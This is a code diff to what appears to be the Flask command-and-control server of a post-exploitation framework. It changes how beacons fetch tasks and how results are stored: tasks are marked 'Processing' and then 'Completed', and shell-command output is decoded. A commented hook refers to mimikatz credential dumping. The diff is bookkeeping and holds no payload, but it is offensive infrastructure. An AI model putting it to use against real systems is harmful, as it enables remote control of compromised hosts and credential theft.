@@ -1,5 +1,5 @@
 from flask import request
-from app.models import StartupTasks, Tasks
+from app.models import StartupTasks, Tasks, TaskResults
 from app.validators import Existance
 from app.operations import Beacon, Result, Task
 from app.generic import Random
@@ -25,6 +25,7 @@ class Pulse:
         process_message = Pulse.create(post_data, remote_ip)
         get_tasks = Tasks.objects(beacon_id=post_data['beacon_id'], task_status="Open").only('id', 'commands')
         result = json.loads(get_tasks.to_json())
+        get_tasks.update(task_status="Processing")
         return result
 
     def create(post_data, remote_ip):
@@ -37,12 +38,19 @@ class Pulse:
         task_exist = Existance.task(beacon_id, task_id)
         if task_exist["result"] == "success":
             decoded_output = base64.b64decode(output)
-            task_enddate = datetime.datetime.now()
             magic_object = magic.Magic(mime=True)
             magic_type = "text/plain" if command == "exec_shell" else magic_object.from_buffer(decoded_output)
             result = Result.store_result(beacon_id, task_id, command, cmd_type, cmd_input, decoded_output, magic_type)
+            current_results = TaskResults.objects(beacon_id=beacon_id, task_id=task_id).count()
+            if current_results == task_exist['data'].commands.count():
+                 task_exist['data'].update(task_status="Completed")
+
             # if 'mimikatz(powershell)' in task_res:
             #     self.mimikatz(beacon_id, task_res, post_data)
+            
+        else:
+            result = {"result":"failed", "data":"Task and/or beacon do not exist"}
+
         return result
 
     def mimikatz(beacon_id, task_res, post_data):
